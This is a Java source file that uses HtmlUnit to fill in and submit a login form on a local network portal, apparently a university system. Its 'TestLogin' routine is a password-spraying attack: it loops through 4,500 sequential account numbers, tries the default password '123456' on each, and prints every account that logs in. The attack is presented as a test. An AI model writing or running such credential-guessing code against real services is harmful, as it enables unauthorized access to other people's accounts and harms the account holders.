package Web;

import com.gargoylesoftware.htmlunit.BrowserVersion;
import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.html.HtmlForm;
import com.gargoylesoftware.htmlunit.html.HtmlPage;
import com.gargoylesoftware.htmlunit.html.HtmlPasswordInput;
import com.gargoylesoftware.htmlunit.html.HtmlSubmitInput;
import com.gargoylesoftware.htmlunit.html.HtmlTextInput;

/**
 * ClassName: LoginCug <br/>
 * Function: TODO ADD FUNCTION. <br/>
 * Reason: TODO ADD REASON(可选). <br/>
 * date: 3 Jun 2017 13:14:11 <br/>
 * 
 * study webpage:
 * http://htmlunit.sourceforge.net/apidocs/allclasses-noframe.html
 * 
 * @author xuheng
 * @version
 * @since JDK 1.6
 */

public class LoginCug {

	// the url
	private static final String Url = "http://192.168.168.42/";
	// username and password of the login website.
	private String username;
	private String password;
	// A application of browser
	private WebClient webClient;

	// A representation of an HTML page returned from a server.
	private HtmlPage loginPage;
	// Wrapper for the HTML element "form".
	private HtmlForm loginForm;

	// Wrapper for the HTML element "input" with type="text".
	private HtmlTextInput usenameField;
	private static final String uFieldName = "username";
	private HtmlPasswordInput passwordField;
	// Wrapper for the HTML element "input" with type="password".
	private static final String pFieldName = "password";
	private HtmlSubmitInput loginBnt;
	private static final String bntValue = "";
	private HtmlPage retPage;

	public LoginCug(String username, String password) {
		this.username = username;
		this.password = password;
		init();
	}

	private void init() {
		webClient = new WebClient(BrowserVersion.CHROME);
		setting();
	}

	private void setting() {
		webClient.getOptions().setJavaScriptEnabled(false);
	}

	public HtmlPage Login() throws Exception {
		loginPage = webClient.getPage(Url);
		// getForms :
		// Returns a list of all the forms in this page.
		loginForm = loginPage.getForms().get(0);

		// Returns the first input element which is a member of this form and
		// has the specified name.
		usenameField = loginForm.getInputByName(uFieldName);
		passwordField = loginForm.getInputByName(pFieldName);
		// Sets the content of the value attribute.
		usenameField.setValueAttribute(username);
		passwordField.setValueAttribute(password);
		// Returns the first input in this form with the specified value.
		loginBnt = loginForm.getInputByValue(bntValue);
		// Simulates clicking on this element, returning the page in the window
		// that has the focus after the element has been clicked.
		retPage = loginBnt.click();
		return retPage;
	}

	// A Testlogin module that use the "http://192.168.168.42/" url.
	private static void TestLogin() {
		// TODO Auto-generated method stub
		long BeginNumber = 20131000000l;
		for (long i = BeginNumber; i < BeginNumber + 4500; i++) {

			String Myusername = i + "";
			String Mypassword = "123456";
			LoginCug logincug = new LoginCug(Myusername, Mypassword);
			try {
				HtmlPage page = logincug.Login();
				String result = page.asXml();
				if (result.indexOf("密码不正确!") != -1 || result.indexOf("该帐号尚未开户!") != -1) {
					// System.out.println("Hello");
				} else {
					System.out.println(Myusername + "" + Mypassword);
					System.out.print("****************");
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	public static void main(String[] args) {
		TestLogin();
	}
}